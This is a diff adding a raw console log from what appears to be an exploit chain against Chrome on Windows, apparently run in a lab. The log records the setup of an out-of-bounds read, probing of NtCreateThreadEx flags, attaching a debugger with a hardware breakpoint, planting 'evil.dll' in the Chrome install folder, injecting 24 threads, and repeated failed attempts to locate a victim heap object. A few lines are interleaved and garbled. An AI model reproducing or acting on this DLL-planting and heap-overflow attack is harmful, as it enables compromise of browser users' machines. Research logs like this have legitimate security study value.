@@ -1,0 +1,89 @@
+[*] hole chain = 0000000040000000
+[*] CPADinfo=00007FF6F7F5E000 sig=0x43506164 size=0x38 bag=00007FF6F7F5C100 entries=41
+[*] 触发读 {page+0xe98, 0xb0}，预期越界 0xb8（vuln）
+[*] plant page = 0x60000000
+[*] container = 000000005F000000
+[*] NtCreateThreadEx flags=0x42 OK
+[*] NtCreateThreadEx flags=0x82 rejected st=0xc00000f5
+[*] NtCreateThreadEx flags=0x102 rejected st=0xc00000f5
+[*] NtCreateThreadEx flags=0x40 OK
+[*] NtCreateThreadEx flags=0x80 rejected st=0xc00000f5
+[*] NtCreateThreadEx flags=0x2 OK
+[*] mode=race dbg=1
+[*] dbg pump (plain) started
+[dbg-pump 17556] WaitForDebugEvent err=6
+[*] dbg pump (0x42) started
+[dbg-pump 17556] WaitForDebugEvent err=6
+[dbg-pump 17556] WaitForDebugEvent err=6
+[dbg-pump 2536] WaitForDebugEvent err=6
+[dbg-pump 2536] WaitForDebugEvent err=6
+[dbg-pump 2536] WaitForDebugEvent err=6
+  [00] handler_pid=18012
+[dbgwrap] handler pid=11532 under debug
+[dbgwrap] chrome.exe base=00007FF678D70000 hwbp@WriteAliasedRaw 0x7ff679090b40 launch 0x7ff6790599c0
+[dbgwrap] exc=0x80000003 addr=0x00007FFC719C26C9 first=1 i0=0x0 i1=0x0
+[dbgwrap] exc=0x406d1388 addr=0x00007FFC6F0D408A first=1 i0=0x1000 i1=0xaa4ddffa10
+  [00] handler(chrome) pid=11532 base=0x7ff678d70000
+[*] base=0x7ff678d70000 plant=0x7ff67913c800
+[*] llw=0x7ffc7027f6c0 dllname=c810.7913.7ff6.dll src=F:\Chrome\chains\chain-87491-85046-78952\logs\lab-residue\seg78952\evil.dll fin=0000000000000104
+[*] evil.dll planted -> F:\Chrome\shared\chrome\chrome-win64-152.0.7977.54\chrome-win64\  [fill] base=0x7ff678d70000 plant=0x7ff67913c800 llw=0x7ffc7027f6c0
+  [00.1.0] pipe-connecting
+  [00.1] pipe hp=00000000000000EC err=0
+  [00.1] registered ok
+  [00.1.0] registered — SetEvent (phase 1)
+[helper] dbg pump thr[dbgead -puminjp 828ect4] ed
+WaitForDebugEvent err=6
+[dbg-pump 8284] WaitForDebugEvent err=6
+[dbg-pump 8284] WaitForDebugEvent err=6
+[helper] injected 24 threads (lasterr=0)
+[*] VICTIM not found (miss)
+[*] VICTIM not found (miss/freed)
+[*] POLL no-blob plant q0=0x7ffc71b0d000 (want 0x7ff67913c800)
+  [00.1.1] pipe-connecting
+  [00.1] pipe hp=00000000000000EC err=0
+  [00.1] registered ok
+  [00.1.1] registered — SetEvent (phase 1)
+[helper] dbg pump threa[dbg-pd injected
+ump 20752] WaitForDebugEvent err=6
+[dbg-pump 20752] WaitForDebugEvent err=6
+[dbg-pump 20752] WaitForDebugEvent err=6
+[helper] injected 24 threads (lasterr=0)
+[*] VICTIM not found (miss)
+[*] VICTIM not found (miss/freed)
+[*] POLL no-blob plant q0=0x7ffc71b0d000 (want 0x7ff67913c800)
+  [00.1.2] pipe-connecting
+  [00.1] pipe hp=00000000000000EC err=0
+  [00.1] registered ok
+  [00.1.2] registered — SetEvent (phase 1)
+[helper] dbg pump thread injected
+[dbg-pump 25760] WaitForDebugEvent err=6
+[dbg-pump 25760] WaitForDebugEvent err=6
+[dbg-pump 25760] WaitForDebugEvent err=6
+[helper] injected 24 threads (lasterr=0)
+[*] VICTIM not found (miss)
+[*] VICTIM not found (miss/freed)
+[*] POLL no-blob plant q0=0x7ffc71b0d000 (want 0x7ff67913c800)
+[*] SCAN blob selfref found@0x0 (plant=0x7ff67913c800)
+[*]   plant[0] read fail
+[*] VICTIM SMMW not found (overflow missed or freed)
+  [00.2.0] pipe-connecting
+  [00.2] pipe hp=00000000000000FC err=0
+  [00.2] registered ok
+  [00.2.0] registered — SetEvent (phase 2)
+[*] VICTIM not found (miss)
+[*] VICTIM not found (miss/freed)
+[*] POLL no-blob plant q0=0x7ffc71b0d000 (want 0x7ff67913c800)
+  [00.2.1] pipe-connecting
+  [00.2] pipe hp=0000000000000174 err=0
+  [00.2] registered ok
+  [00.2.1] registered — SetEvent (phase 2)
+[*] VICTIM not found (miss)
+[*] VICTIM not found (miss/freed)
+[*] POLL no-blob plant q0=0x7ffc71b0d000 (want 0x7ff67913c800)
+  [00.2.2] pipe-connecting
+  [00.2] pipe hp=0000000000000174 err=0
+  [00.2] registered ok
+  [00.2.2] registered — SetEvent (phase 2)
+[dbgwrap] exc=0x80000004 addr=0x00007FF679090B40 first=1 i0=0x0 i1=0x0
+[dbgwrap] WAW#0 this=0x30e8002b4c38 data=0x30e8000eb000 size=0xf00 cs_=0x7ff67913c810 buf_=0x7ff67913b900 bsz=0x1000 used=0xf00 ret_rva=0x337f04
+[dbgwrap] WaitForDebugEvent err=121
